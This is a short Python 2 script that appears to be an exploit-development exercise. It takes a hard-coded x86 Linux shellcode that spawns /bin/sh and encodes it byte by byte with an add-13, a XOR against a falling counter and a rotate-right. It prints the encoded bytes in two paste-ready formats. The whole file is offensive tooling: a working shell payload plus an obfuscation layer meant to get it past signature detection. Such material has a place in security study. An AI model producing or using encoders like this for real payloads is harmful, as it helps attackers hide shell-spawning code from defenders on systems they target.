def ror(val, rot):
	return ((val & 0xff) >> rot % 8 ) | (val << ( 8 - (rot % 8)) & 0xff)

def main():
	shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80")

	print "Encoding shellcode with ROT 13, XOR and Right Shift..."

	encoded = ""
	encoded2 = ""

	i = len(bytearray(shellcode))
	for x in bytearray(shellcode):
		y = ror(((x+13)^i),2) #Rot13, Xor and Right Shift 2

		encoded += "\\x"
		encoded += "%02x" % y

		encoded2 += "0x"
		encoded2 += "%02x," % y
		i -= 1

	print "Shellcode lenght: %d\n\n" % len(bytearray(shellcode))
	print "Encoded Shellcode:\n"
	print "Format 1:"
	print "\t",encoded
	print "\nFormat 2:"
	print "\t",encoded2[:-1]

if __name__ == "__main__":
    main()

